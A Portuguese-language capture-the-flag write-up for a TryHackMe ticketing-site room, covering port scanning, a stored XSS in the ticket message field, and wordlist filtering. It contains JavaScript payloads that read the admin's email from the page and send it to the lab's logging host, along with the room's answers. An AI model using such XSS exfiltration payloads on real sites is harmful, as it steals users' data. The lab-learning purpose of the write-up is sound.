#ctf 

https://tryhackme.com/room/thatstheticket

## Recon

NMAP:

```
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
80/tcp open  http    nginx 1.14.0 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Contas que criei:

```
teste@email.com:123456
```

Ao criar um ticket é possível injetar script em **message**

```html
</textarea><script>alert(1)</script>
```

Tentei ver se era possível pegar o email por parâmetro usando a proxy do lab, porém não foi possível.

```html
</textarea>
<script>
var email = document.getElementById('email').innerHTML;
var attacker = "http://3da9fd746d79d6609ab3f5882d62dce0.log.tryhackme.tech/";
var xhr  = new XMLHttpRequest();
xhr.open("GET", attacker + "?=" + email,true);
xhr.send(null);
</script>
```

Então inverti e passei como subdomínio da url da proxy e consegui ver qual era o domínio do email. Porém precisava saber o que vinha antes do @, e era justamene o @ que impedia de saber o email completo entao apenas substitui ele por um caracter qualquer.

```html
</textarea>
<script>
var email = (document.getElementById('email').innerHTML).replace('@', '-arroba-');
var xhr  = new XMLHttpRequest();
xhr.open("GET", "http://"+email+".3da9fd746d79d6609ab3f5882d62dce0.log.tryhackme.tech",true);
xhr.send(null);
</script>
```

Email do admin: adminaccount@itsupport.thm

Ao criar um usuário, a senha deve conter no mínimo 6 letras (dei uma roubada e vi que o input da pergunta "Admin users password" era 6 caracteres :s) usei o seguinte código para filtrar o rockyou.txt

```sh
awk 'length($0) == 6' /usr/share/wordlists/rockyou.txt > wordlist.txt
```

A senha é: 123123. GG